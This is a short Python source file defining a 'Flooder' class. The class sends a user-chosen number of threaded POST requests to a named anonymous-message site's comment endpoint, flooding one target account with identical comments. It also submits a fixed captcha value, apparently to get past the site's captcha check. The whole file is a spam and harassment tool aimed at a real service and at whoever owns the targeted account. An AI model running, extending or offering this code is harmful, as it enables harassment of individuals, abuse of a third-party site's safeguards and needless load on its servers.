from .request import PostRequest
from threading import Thread

class Flooder(object):
    def floodAccount(self, account, times, comment):
        self.url = "http://thiscrush.com/postcrush.php"
        self.payload = {
            "id": str(account),
            "private": "",
            "anon": "",
            "name": str(comment["title"]),
            "comment": str(comment["content"]),
            "captcha_result": 0
        }
        self.times = int(times)
        self.__startFlood()
    
    def __threadedClient(self, number):
        print("Requesting on thread number {}...".format(str(number)))
        self.client.resolve()
    
    def __startFlood(self):
        self.client = PostRequest(
            url = self.url,
            payload = self.payload
        )

        for num in range(self.times):
            Thread(
                target = self.__threadedClient,
                args = (num, )
            ).start()
        